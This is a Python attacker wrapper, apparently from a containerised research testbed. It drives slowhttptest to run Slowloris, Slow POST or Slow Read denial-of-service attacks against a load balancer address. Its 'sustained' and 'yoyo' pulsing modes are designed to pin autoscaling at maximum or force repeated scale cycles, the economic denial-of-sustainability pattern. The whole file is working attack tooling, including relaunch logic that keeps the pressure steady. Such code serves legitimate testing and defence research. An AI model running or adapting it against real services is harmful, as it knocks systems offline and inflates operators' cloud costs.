#!/usr/bin/env python3
# Copyright (C) 2022 Alexandre Mitsuru Kaihara
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

# Brief: EDoS attacker wrapper. Runs INSIDE an attacker container. It ensures
# slowhttptest is installed, then drives a low-and-slow attack (Slowloris /
# Slow POST / Slow Read) against the load balancer VIP. Two orchestration modes:
#   sustained -> keep the tool running: pins the service at max replicas.
#   yoyo      -> pulse ON for PULSE_ON then OFF for PULSE_OFF: forces repeated
#                scale-up/scale-down cycles (the classic EDoS pattern).
#
# Usage:
#   edos_attacker.py --mode yoyo --target 192.168.100.10 --port 80 \
#       --test slowloris --conns 200 --rate 50 --interval 10 \
#       --pulse-on 20 --pulse-off 20

import argparse
import signal
import subprocess
import sys
import time

# slowhttptest attack-type flag per test name
TEST_FLAG = {
    'slowloris': '-H',   # slow headers
    'slowpost': '-B',    # slow message body
    'slowread': '-X',    # slow read
}


def ensure_installed():
    if subprocess.run("which slowhttptest", shell=True,
                      capture_output=True).returncode == 0:
        return
    sys.stderr.write("[attacker] installing slowhttptest...\n")
    sys.stderr.flush()
    # The base image ships a dead third-party APT source (bintray/seafile) that
    # makes `apt-get update` exit non-zero. Drop it, and DON'T gate the install
    # on update's exit code (';' not '&&'), otherwise the install never runs.
    subprocess.run(
        "rm -f /etc/apt/sources.list.d/seafile.list; "
        "apt-get update -y; "
        "apt-get install -y slowhttptest",
        shell=True, capture_output=True)
    if subprocess.run("which slowhttptest", shell=True,
                      capture_output=True).returncode != 0:
        sys.stderr.write("[attacker] WARNING: slowhttptest install failed\n")
        sys.stderr.flush()


def build_cmd(args, duration):
    flag = TEST_FLAG.get(args.test, '-H')
    url = f"http://{args.target}:{args.port}/"
    # -g/-o would emit a report; we suppress output and just hold connections.
    cmd = (
        f"slowhttptest {flag} -c {args.conns} -r {args.rate} "
        f"-l {duration} -t GET -u {url} -p 3"
    )
    if args.test == 'slowread':
        # Slow READ needs read-window shaping, otherwise it finishes reading the
        # response quickly and the connections close (so nothing stays saturated).
        # -n interval between reads, -w/-y advertised window range, -z bytes/read.
        cmd += (f" -n {args.read_interval} -w {args.read_win_lo} "
                f"-y {args.read_win_hi} -z {args.read_bytes}")
    else:
        # Slow headers/body: -i keeps the request alive, -x bounds follow-up data.
        cmd += f" -i {args.interval} -x 24"
    return cmd


# slowhttptest's own stdout/stderr go here (previously discarded to DEVNULL,
# which left us blind to WHY the tool ended early). Read it to diagnose runs.
SLOWHTTPTEST_LOG = '/home/slowhttptest.log'


def run_once(cmd, duration):
    # Returns True if slowhttptest exited on its own before the deadline, False
    # if we stopped it because the deadline was reached. The caller uses this to
    # decide whether to relaunch (sustained mode).
    with open(SLOWHTTPTEST_LOG, 'a') as log:
        log.write(f"\n[attacker] === run: {cmd} (deadline {duration}s) ===\n")
        log.flush()
        proc = subprocess.Popen(cmd, shell=True, stdout=log, stderr=log)
        deadline = time.time() + duration
        while time.time() < deadline and proc.poll() is None:
            time.sleep(0.5)
        exited_early = proc.poll() is not None
        if not exited_early:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        else:
            log.write(f"[attacker] slowhttptest exited early "
                      f"(rc={proc.returncode})\n")
            log.flush()
    return exited_early


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--mode', default='yoyo', choices=['yoyo', 'sustained'])
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--test', default='slowloris', choices=list(TEST_FLAG))
    parser.add_argument('--conns', type=int, default=200)
    parser.add_argument('--rate', type=int, default=50)
    parser.add_argument('--interval', type=int, default=10)
    parser.add_argument('--pulse-on', type=int, default=20)
    parser.add_argument('--pulse-off', type=int, default=20)
    # Total run length for sustained mode (0 = unlimited -> a long -l value).
    parser.add_argument('--duration', type=int, default=0)
    # Slow Read (-X) shaping; ignored by the other tests.
    parser.add_argument('--read-interval', type=int, default=5)
    parser.add_argument('--read-win-lo', type=int, default=512)
    parser.add_argument('--read-win-hi', type=int, default=1024)
    parser.add_argument('--read-bytes', type=int, default=32)
    args = parser.parse_args()

    # Clean shutdown when the orchestrator kills us.
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))

    ensure_installed()

    if args.mode == 'sustained':
        # Keep the pool saturated for the whole experiment. Ideally a single long
        # run holds the connections the entire time, but slowhttptest can end
        # early (e.g. the backend severs the slow connections), and a single run
        # then leaves the rest of the experiment with zero attack. So relaunch
        # until the total duration is spent -- but ONLY when the tool actually
        # exits, never on a fixed short interval (the old busy-respawn re-ramped
        # from zero every few seconds, which made the pressure bursty).
        total = args.duration if args.duration > 0 else 86400
        deadline = time.time() + total
        attempt = 0
        while time.time() < deadline:
            remaining = int(deadline - time.time())
            if remaining <= 0:
                break
            attempt += 1
            sys.stderr.write(f"[attacker] sustained run #{attempt} "
                             f"({remaining}s left)\n")
            sys.stderr.flush()
            exited_early = run_once(build_cmd(args, duration=remaining),
                                    duration=remaining)
            if not exited_early:
                # Held the connections until the deadline: we're done.
                break
            # Exited early: back off briefly so a target that refuses instantly
            # can't spin us in a tight loop, then relaunch for the time left.
            time.sleep(1)
    else:  # yoyo
        while True:
            sys.stderr.write("[attacker] pulse ON\n")
            sys.stderr.flush()
            run_once(build_cmd(args, duration=args.pulse_on), duration=args.pulse_on)
            sys.stderr.write("[attacker] pulse OFF\n")
            sys.stderr.flush()
            time.sleep(args.pulse_off)


if __name__ == '__main__':
    main()
